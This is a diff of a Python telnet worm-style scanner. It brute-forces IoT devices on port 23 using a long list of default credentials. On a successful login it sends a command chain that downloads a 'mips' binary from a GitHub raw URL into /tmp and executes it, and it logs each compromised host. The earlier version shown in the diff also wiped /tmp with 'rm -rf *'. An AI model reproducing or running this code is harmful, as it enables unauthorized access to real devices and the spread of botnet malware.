@@ -1,22 +1,30 @@
+#!/usr/bin/python3
 import threading
-import sys
-import os
-import time
-import socket
-import select
-from queue import Queue
+import sys, os, re, time, socket
+from queue import Queue  # updated import
 from sys import stdout
 
-p1 = "wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips"
-p2 = "busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips"
-p3 = "/bin/busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips"
-p4 = "chmod 777 mips; ./mips"
-
 if len(sys.argv) < 4:
-    print(f"Usage: python {sys.argv[0]} <list> <threads> <output file>")
+    print("Usage: python " + sys.argv[0] + " <list> <threads> <output file>")
     sys.exit()
 
-combo = ["admin:admin"]
+combo = [ 
+    "root:root", "root:", "admin:admin", "support:support", "user:user", 
+    "admin:", "admin:password", "root:vizxv", "root:admin", "root:xc3511",
+    "root:888888", "root:xmhdipc", "root:default", "root:juantech", 
+    "root:123456", "root:54321", "root:12345", "root:pass", "ubnt:ubnt", 
+    "root:klv1234", "root:Zte521", "root:hi3518", "root:jvbzd", "root:anko", 
+    "root:zlxx.", "root:7ujMko0vizxv", "root:7ujMko0admin", "root:system", 
+    "root:ikwb", "root:dreambox", "root:user", "root:realtek", "root:00000000", 
+    "admin:1111111", "admin:1234", "admin:12345", "admin:54321", "admin:123456", 
+    "admin:7ujMko0admin", "admin:1234", "admin:pass", "admin:meinsm", 
+    "admin:admin1234", "root:1111", "admin:smcadmin", "admin:1111", "root:666666", 
+    "root:password", "root:1234", "root:klv123", "Administrator:admin", 
+    "service:service", "supervisor:supervisor", "guest:guest", "guest:12345", 
+    "guest:12345", "admin1:password", "administrator:1234", "666666:666666", 
+    "888888:888888", "tech:tech", "mother:fucker"
+]
+
 ips = open(sys.argv[1], "r").readlines()
 threads = int(sys.argv[2])
 output_file = sys.argv[3]
@@ -25,37 +33,22 @@ queue_count = 0
 
 for ip in ips:
     queue_count += 1
-    stdout.write(f"\r[{queue_count}] Added to queue")
+    stdout.write("\r[%d] Added to queue" % queue_count)
     stdout.flush()
-    queue.put(ip.strip())
+    queue.put(ip)
 print("\n")
 
-def read_until(tn, string, timeout=8):
-    buf = ''
-    start_time = time.time()
-    while time.time() - start_time < timeout:
-        buf += tn.recv(1024).decode()
-        time.sleep(0.1)
-        if string in buf:
-            return buf
-    raise Exception('TIMEOUT!')
 
-def recv_timeout(sock, size, timeout=8):
-    sock.setblocking(0)
-    ready = select.select([sock], [], [], timeout)
-    if ready[0]:
-        data = sock.recv(size)
-        return data.decode()
-    return ""
-
-class VbrXmr(threading.Thread):
+class router(threading.Thread):
     def __init__(self, ip):
-        super().__init__()
-        self.ip = ip
+        threading.Thread.__init__(self)
+        self.ip = str(ip).rstrip('\n')
+        self.rekdevice = "cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips"  # command to send
 
     def run(self):
         global fh
-        username, password = "", ""
+        username = ""
+        password = ""
         for passwd in combo:
             if ":n/a" in passwd:
                 password = ""
@@ -65,85 +58,84 @@ class VbrXmr(threading.Thread):
                 username = ""
             else:
                 username = passwd.split(":")[0]
-
             try:
-                tn = socket.socket()
-                tn.settimeout(1)
+                tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                tn.settimeout(0.37)
                 tn.connect((self.ip, 23))
             except Exception:
-                continue
-
+                tn.close()
+                break
             try:
-                XDSL_BCM = read_until(tn, ":")
-                if ":" in XDSL_BCM:
-                    tn.send((username + "\n").encode())
-                    time.sleep(0.09)
+                hoho = ''
+                hoho += readUntil(tn, ":")
+                if ":" in hoho:
+                    tn.send((username + "\r\n").encode())  # encode for Python3
+                    time.sleep(0.1)
             except Exception:
                 tn.close()
-                continue
-            
             try:
-                XDSL_BCM = read_until(tn, ":")
-                if ":" in XDSL_BCM:
-                    tn.send((password + "\n").encode())
-                    time.sleep(0.8)
+                hoho = ''
+                hoho += readUntil(tn, ":")
+                if ":" in hoho:
+                    tn.send((password + "\r\n").encode())  # encode for Python3
+                    time.sleep(0.1)
+                else:
+                    pass
             except Exception:
                 tn.close()
-                continue
-
             try:
-                prompt = tn.recv(40960).decode()
-                success = any(s in prompt for s in [">", "#", "$", "root@"])
+                prompt = tn.recv(40960).decode()  # decode for Python3
+                if "#" in prompt or "$" in prompt:
+                    success = True              
+                else:
+                    tn.close()
                 if success:
-                    print(f"[XDSL_BCM] LOGIN FOUND - {self.ip} [{username}:{password}]")
-                    fh.write(f"{self.ip}:23 {username}:{password}\n")
-                    fh.flush()
-                    tn.send("sh\r\n".encode())
-                    time.sleep(0.1)
-                    tn.send("shell\r\n".encode())
-                    time.sleep(0.1)
-                    tn.send("ls /\r\n".encode())
-                    time.sleep(1)
-                    
-                    timeout = 8
-                    buf = ''
-                    start_time = time.time()
-                    while time.time() - start_time < timeout:
-                        buf += recv_timeout(tn, 40960)
-                        time.sleep(0.1)
-                        if "tmp" in buf and "unrecognized" not in buf:
-                            tn.send("sh\n".encode())
-                            time.sleep(1)
-                            tn.send("cd /tmp\n".encode())
-                            tn.send("rm -rf *\n".encode())
-                            tn.send((p1 + "\n").encode())
-                            tn.send((p2 + "\n").encode())
-                            tn.send((p3 + "\n").encode())
-                            tn.send((p4 + "\n").encode())
-                            print(f"[XDSL_BCM] INFECTED - {self.ip} [{username}:{password}]")
-                            with open("xdsl_bcm.txt", "a") as f:
-                                f.write(f"{self.ip}:23 {username}:{password}\n")
-                            time.sleep(10)
-                            tn.close()
-                            break
+                    try:
+                        tn.send((self.rekdevice + "\r\n").encode())  # encode for Python3
+                        fh.write(self.ip + ":23 " + username + ":" + password + "\n")  # 1.1.1.1:23 user:pass # mirai
+                        fh.flush()
+                        print("[+] GOTCHA -> %s:%s:%s" % (username, password, self.ip))
+                        tn.close()
+                        break
+                    except:
+                        tn.close()
+                else:
                     tn.close()
             except Exception:
                 tn.close()
 
+
+def readUntil(tn, string, timeout=8):
+    buf = ''
+    start_time = time.time()
+    while time.time() - start_time < timeout:
+        buf += tn.recv(1024).decode()  # decode for Python3
+        time.sleep(0.01)
+        if string in buf: 
+            return buf
+    raise Exception('TIMEOUT!')
+
+
 def worker():
-    while True:
-        try:
-            IP = queue.get()
-            thread = VbrXmr(IP)
-            thread.start()
-            queue.task_done()
-            time.sleep(0.02)
-        except Exception:
-            pass
+    try:
+        while True:
+            try:
+                IP = queue.get()
+                thread = router(IP)
+                thread.start()
+                queue.task_done()
+                time.sleep(0.02)
+            except:
+                pass
+    except:
+        pass
 
-fh = open(output_file, "a")
-for _ in range(threads):
-    threading.Thread(target=worker).start()
 
-input("Press Enter to exit...")  # Replaced raw_input with input
-os.kill(os.getpid(), 9)
+global fh
+fh = open("workingtelnet.txt", "a")
+for l in range(threads):  # xrange replaced with range
+    try:
+        t = threading.Thread(target=worker)
+        t.start()
+    except:
+        pass
